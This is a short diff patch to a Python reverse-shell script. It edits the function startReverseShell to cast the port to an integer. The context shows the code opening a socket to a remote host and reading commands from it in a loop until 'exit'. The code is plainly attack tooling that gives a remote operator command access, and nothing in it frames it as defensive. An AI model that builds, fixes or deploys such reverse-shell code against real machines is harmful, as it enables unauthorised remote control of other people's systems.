@@ -12,7 +12,7 @@ WAIT_TIME = 10
 
 def startReverseShell(HOST, PORT):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
+        s.connect((HOST, int(PORT)))
         while True:
             cmd = s.recv(1024).decode().strip()
             if not cmd or cmd.lower() == "exit":
